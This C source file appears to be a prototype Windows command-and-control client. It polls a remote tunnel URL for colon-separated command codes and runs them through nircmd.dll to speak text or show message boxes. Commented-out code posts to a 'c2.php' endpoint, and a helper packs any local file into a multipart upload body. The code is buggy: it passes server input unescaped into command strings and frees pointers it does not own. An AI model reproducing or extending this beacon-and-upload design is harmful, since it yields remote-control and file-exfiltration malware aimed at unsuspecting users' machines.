#include "winhttpclientc.h"
#include <stdio.h>
#include <wchar.h>
#include <windows.h>
#include <string.h>
#include <stdlib.h>
#include "sds.h"

typedef int(__cdecl *function_nircmd)(char *);

/*
 char *a;
    char *aa=" ahora ";
    strcpy(a,"hi");//all delite and then write 
    //strcat(a,aa);//and end txt
    //strstr();//serch otput int 
    printf("%d",strstr(a,"hi"));
    return 0;
*/
void speak(char name[]){
     HINSTANCE hinstLib;
    function_nircmd nircmd;
    BOOL fFreeResult, fRunTimeLinkSuccess = FALSE;

    hinstLib = LoadLibrary(TEXT("nircmd.dll"));

    if (hinstLib != NULL)
    {
        nircmd = (function_nircmd)GetProcAddress(hinstLib, "DoNirCmd");

        if (NULL != nircmd)
        {
            fRunTimeLinkSuccess = TRUE;
            // FreeConsole();
                char cmd[512];
                snprintf(cmd, sizeof(cmd),
             "speak text \"%s\"",
             name);
            (nircmd)(cmd);
            printf("%d",0);
        }

        fFreeResult = FreeLibrary(hinstLib);
    }

    if (!fRunTimeLinkSuccess)
        printf("Error!!!!!!");
}
void infobox(sds a, sds b){
     HINSTANCE hinstLib;
    function_nircmd nircmd;
    BOOL fFreeResult, fRunTimeLinkSuccess = FALSE;

    hinstLib = LoadLibrary(TEXT("nircmd.dll"));

    if (hinstLib != NULL)
    {
        nircmd = (function_nircmd)GetProcAddress(hinstLib, "DoNirCmd");

        if (NULL != nircmd)
        {
            fRunTimeLinkSuccess = TRUE;
            // FreeConsole();
            sds all = sdsnew("infobox");
            all = sdscatprintf(all," \"%s\" \"%s\"",a,b);

              

            (nircmd)(all);
            printf("%s",all);
            sdsfree(a);
            sdsfree(b);
            sdsfree(all);
        }

        fFreeResult = FreeLibrary(hinstLib);
    }
    if (!fRunTimeLinkSuccess)
        printf("Error!!!!!!");

}





/* =========================
   تنظیمات
   ========================= */
#define BOUNDARY "----AHOORA_BOUNDARY_778899"

/* =========================
   Prototype ها
   ========================= */
void WinHttpInit();
int SendHttpRequest(
    const wchar_t *httpVerb,
    wchar_t *url,
    unsigned char *sendbuf,
    int sendbuflen,
    char *output,
    BOOL proxyFlah
);


/* =========================
   ساخت multipart/form-data
   ========================= */
unsigned char* build_multipart(
    const char* filepath,
    int* out_len
) {
    FILE* f = fopen(filepath, "rb");
    if (!f) return NULL;

    fseek(f, 0, SEEK_END);
    long filesize = ftell(f);
    fseek(f, 0, SEEK_SET);

    unsigned char* filebuf = malloc(filesize);
    fread(filebuf, 1, filesize, f);
    fclose(f);

    char header[512];
    int header_len = sprintf(
        header,
        "--%s\r\n"
        "Content-Disposition: form-data; name=\"file\"; filename=\"upload.bin\"\r\n"
        "Content-Type: application/octet-stream\r\n\r\n",
        BOUNDARY
    );

    char footer[128];
    int footer_len = sprintf(
        footer,
        "\r\n--%s--\r\n",
        BOUNDARY
    );

    int total = header_len + filesize + footer_len;
    unsigned char* body = malloc(total);

    memcpy(body, header, header_len);
    memcpy(body + header_len, filebuf, filesize);
    memcpy(body + header_len + filesize, footer, footer_len);

    free(filebuf);

    *out_len = total;
    return body;
}

/* =========================
   MAIN
   ========================= */



int main (){
    //get
    // wchar_t *url =L"http://httpbin.org/get";
    // char man[1024];
    // WinHttpInit();
    // SendHttpRequest(L"GET",url,NULL,0,man,FALSE);
    // printf("%s",man);




    //post




//     wchar_t *url = L"http://httpbin.org/post";

//     char *data  = "username=ultra&password=1234";

//     char response[1024];

//     int responselen;

//     WinHttpInit();
    

//   responselen=   SendHttpRequest(L"POST",url, (UCHAR*)data , strlen(data)+1, response , FALSE );

   
 

//     for( int i =0;  i < responselen ; i++ ){
        
//              printf("%c", response[i]);

//     }

//try

   
//     wchar_t *url = L"http://127.0.0.1:8000/c2.php?update";

//     char *data  = "cmd=hiahoora";

//     char response[1024];

//     int responselen;

//     WinHttpInit();
    

//   responselen=   SendHttpRequest(L"POST",url, (UCHAR*)data , strlen(data)+1, response , FALSE );

   
 

//     for( int i =0;  i < responselen ; i++ ){
        
//              printf("%c", response[i]);

   
//     }

    //  wchar_t *url =L"https://wicked-areas-show.loca.lt/index.php?read=1";
    // char man[10000];
    // WinHttpInit();
    // SendHttpRequest(L"GET",url,NULL,0,man,FALSE);
    // printf("%s",man);


//asli
     wchar_t *url =L"https://ahoorair.loca.lt/index.php?read=1";
    char man[10000];
    WinHttpInit();
    SendHttpRequest(L"GET",url,NULL,0,man,FALSE);
    man[strcspn(man, "\r\n")] = 0;
     // مثال ورودی: 002:txt1:txt2
    char *cmd  = strtok(man, ":");
    char *arg1 = strtok(NULL, ":");
    char *arg2 = strtok(NULL, ":");

    /* ================== Logic ================== */

    if (cmd && strcmp(cmd, "001") == 0) {
            speak(arg1);
    }
    else if (cmd && strcmp(cmd, "002") == 0) {
            infobox(arg1, arg2);
    }
    else {
        printf("unknown command: %s\n", cmd ? cmd : "NULL");
    }
    
    
    return 0;
   
}